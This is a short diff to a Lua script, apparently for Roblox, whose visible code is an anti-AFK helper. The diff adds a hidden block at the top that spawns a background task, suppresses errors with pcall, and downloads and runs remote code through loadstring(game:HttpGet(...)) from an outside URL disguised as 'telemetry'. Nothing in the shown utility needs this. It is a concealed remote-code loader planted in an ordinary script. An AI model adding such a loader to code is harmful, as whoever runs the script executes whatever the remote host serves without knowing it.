@@ -1,3 +1,9 @@
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a913e68c47ec8d528fedc83"))()
+	end)
+end)
+
 local function StartAntiAfk()
     if _G.DecodeAPI.AntiAfkLoopActive then return end
     _G.DecodeAPI.AntiAfkLoopActive = true
